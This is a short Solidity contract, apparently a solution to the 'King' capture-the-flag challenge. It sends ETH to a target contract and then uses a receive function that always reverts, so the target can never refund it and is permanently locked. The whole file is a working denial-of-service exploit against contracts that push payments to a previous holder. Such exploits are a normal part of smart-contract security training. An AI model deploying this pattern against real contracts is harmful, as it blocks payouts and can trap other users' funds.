// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingAttacker {
  
  function attack(address challenge) public payable {
    (bool success,) = challenge.call{value: msg.value}("");
    require(success, "Transfer failed!");
  }

  receive() external payable {
    require(false, "No ETH transfers accepted - this breaks the king!");
  }
}